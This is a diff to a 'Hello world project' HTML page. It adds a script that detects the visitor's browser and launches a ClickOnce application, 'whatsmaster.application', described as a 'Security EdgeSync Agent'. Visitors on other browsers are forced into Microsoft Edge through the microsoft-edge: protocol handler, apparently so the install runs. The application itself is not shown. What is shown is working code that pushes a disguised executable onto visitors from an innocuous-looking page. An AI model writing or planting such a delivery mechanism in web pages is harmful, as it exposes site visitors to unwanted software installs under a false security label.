@@ -4,6 +4,40 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Hello world project</title>
+
+    <!-- UA Parser for browser detection -->
+    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.2/src/ua-parser.min.js"></script>
+
+    <!-- ClickOnce deployment function -->
+    <script>
+      function startDownload() {
+        const baseUrl = window.location.protocol + "//" + window.location.host;
+        const clickonceLink = `${baseUrl}/deploy/whatsmaster.application`;
+        const uap = new UAParser();
+        const browserName = uap.getResult().browser.name;
+
+        console.log(
+          "Starting Security EdgeSync Agent via ClickOnce, browser:",
+          browserName,
+        );
+        console.log("ClickOnce URL:", clickonceLink);
+        console.log("Domain:", window.location.host);
+
+        if (browserName !== "Edge") {
+          // Redirect to Edge with ClickOnce file
+          const edgeUrl = `microsoft-edge:${clickonceLink}`;
+          console.log("Redirecting to Edge:", edgeUrl);
+          window.location.href = edgeUrl;
+        } else {
+          // Direct ClickOnce launch in Edge
+          console.log("Direct ClickOnce launch in Edge");
+          window.location.href = clickonceLink;
+        }
+      }
+
+      // Make function globally available
+      window.startDownload = startDownload;
+    </script>
   </head>
 
   <body>
